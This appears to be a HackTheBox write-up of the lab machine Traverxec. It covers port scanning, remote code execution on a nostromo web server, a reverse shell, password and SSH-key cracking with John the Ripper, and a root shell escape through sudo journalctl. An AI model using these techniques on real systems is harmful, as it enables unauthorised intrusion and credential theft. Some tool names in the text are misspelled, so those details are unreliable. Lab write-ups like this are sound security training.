---
title: "Traverxec - HackTheBox"
layout: single
excerpt: "This is an easy machine, for the intrusion I found a vulnerable version of a service that was running on the machine, called nostromo, I used a GitHub exploit for that version and gained arbitrary code execution, for the privilege escalation I took advantage of a utility that I could run as the root user, I had to minimize the terminal to bypass it."
header:
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/69093629/126876755-6309d046-4662-44f8-b4ba-8c74e6bd84ee.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/69093629/125662338-fd8b3b19-3a48-4fb0-b07c-86c047265082.png"
categories:
  - HackTheBox
tags:
  - boatswain 1.9.6
  - journalctl 
  - id_rsa
  - public_www
---

![image (29)](https://user-images.githubusercontent.com/69093629/126876755-6309d046-4662-44f8-b4ba-8c74e6bd84ee.png)

I started by doing a scan with `Nmap` to detect open ports and services.

```bash 
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ nmap -sS --min-rate=5000 --open -v -n 10.10.10.165 -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 17:42 CEST
Initiating Ping Scan at 17:42
Scanning 10.10.10.165 [4 ports]
Completed Ping Scan at 17:42, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:42
Scanning 10.10.10.165 [1000 ports]
Discovered open port 80/tcp on 10.10.10.165
Discovered open port 22/tcp on 10.10.10.165
Completed SYN Stealth Scan at 17:42, 0.67s elapsed (1000 total ports)
Nmap scan report for 10.10.10.165
Host is up (0.052s latency).
Not shown: 998 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
       	Raw packets sent: 2002 (88.064KB) | Rcvd: 4 (156B)
```

Perform another scan to verify the version and service of each port found.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ nmap -sC -sV 10.10.10.165 -oN webscan                     	 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 17:42 CEST
Nmap scan report for 10.10.10.165
Host is up (0.051s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http	nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.42 seconds
```

I saw that the web server was running a service called `nostromo`, that caught my attention so I looked to see if there was a vulnerable version and found the following exploit.

![Captura de pantalla (659)](https://user-images.githubusercontent.com/69093629/126877395-67a38c00-0e95-44ca-8aea-3c5ae5e33910.png)

Its use was simple, I specified the IP and port where the server was running and the command I wanted to execute.

![rce](https://user-images.githubusercontent.com/69093629/126877425-672ccd58-f4e1-4a0d-a530-4eb42dc8d553.png)

I already had arbitrary code execution, I started a reverse shell on port 443 using `mkfifo`.

![mkfifo](https://user-images.githubusercontent.com/69093629/126877472-1b4ea9dd-c8f0-4423-803c-34cc5914e72a.png)

I also did a `TTY` treatment to have a full interactive Shell and be more comfortable.

![tratamiento de la tty](https://user-images.githubusercontent.com/69093629/126877763-ab10f4a5-d16c-4a53-af02-9c784d9e4ef3.png)

After a little research I managed to find a file that gave me a lot of information for the next step.

![archivo](https://user-images.githubusercontent.com/69093629/126877546-9d3cd5b1-8414-4708-b87c-6bad7cba8238.png)

First I catned a route that caught my attention, it had a hashed credential, I cracked it with `john the ripper`.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me   	(david)
1g 0:00:03:19 DONE (2021-07-24 18:02) 0.005009g/s 52994p/s 52994c/s 52994C/s Noyoudo..November^
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
 
I thought it was the password for the user `david` but no, looking at the file it also reported a `public_www`, after a search on `Google` I managed to conclude that it was a directory on the web server, I was able to access it from the Shell that I already had and found a file called `backup-ssh-identity-files.tgz`.

![backups](https://user-images.githubusercontent.com/69093629/126877684-859b5c6d-ce93-4a5f-a897-6f245d1d18e5.png)

I transferred it with `netcat` to see what I had.

![usandonetcat](https://user-images.githubusercontent.com/69093629/126877698-e6f127bc-f123-4cf1-bc1f-1c657c0f575d.png)

I unzipped it with `7z` and found an `id_rsa`, an `ssh` access key.

![id_rsa](https://user-images.githubusercontent.com/69093629/126877810-4e2bb17a-6b1e-41e8-a284-74baf5c16b40.png)

But it was password encrypted.

![id_rsaimagen](https://user-images.githubusercontent.com/69093629/126877827-b77756fd-262a-416a-8b0e-b1068a0aeaf4.png)

To crack his password I used the `ssh2john` utility which extracted its equivalent `hash`.

![ssh2john](https://user-images.githubusercontent.com/69093629/126877843-6278676c-ba96-4479-b101-cd4b618f9184.png)

Copy the `hash` to a file called `hashs` and crack it with `john the ripper`.

```bash
┌─[root@parrot]─[/home/wackyhacker/Desktop]
└──╼ john --wordlist=/usr/share/wordlists/rockyou.txt hash2                         	1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter       	(?)
1g 0:00:00:07 DONE (2021-07-24 18:33) 0.1412g/s 2025Kp/s 2025Kc/s 2025KC/sa6_123..*7¡Vamos!
Session completed
```

I managed to crack it, I gave permissions 600 to the `id_rsa` and accessed it using the cracked password, and I was able to view the user's "flag".

![flagdelusuario](https://user-images.githubusercontent.com/69093629/126877894-9e3ee2db-8068-4d07-a07c-f70c1a72d844.jpg)

<hr>
<h1 align="center"><b>ESCALADA DE PRIVILEGIOS</b></h1>

For privilege escalation I found a script called `server-stats.sh` that runs `journalctl` with `sudo` privileges.

![scriptjournal](https://user-images.githubusercontent.com/69093629/126877934-04d8043d-2028-4b83-be0c-65cdc24ae5f8.png)

I headed over to [gftobins](https://gftobins.github.io) and filtered for `journalctl` to see if I could leverage it for scaling.

![sudoengftobins](https://user-images.githubusercontent.com/69093629/126877969-0b373f52-acae-485f-9e13-c69095c274b1.png)

Apparently yes, what I did was run `journalctl` followed by the script syntax and removing the `/usr/bin/cat` because it had to be in `lees` or `more` format, I minimized the terminal and typed `!/bin/sh` and became `root`, I could now view the "flag".

![rut (1)](https://user-images.githubusercontent.com/69093629/126878038-5de15da2-952c-48d8-86ec-b95c5554b370.jpg)














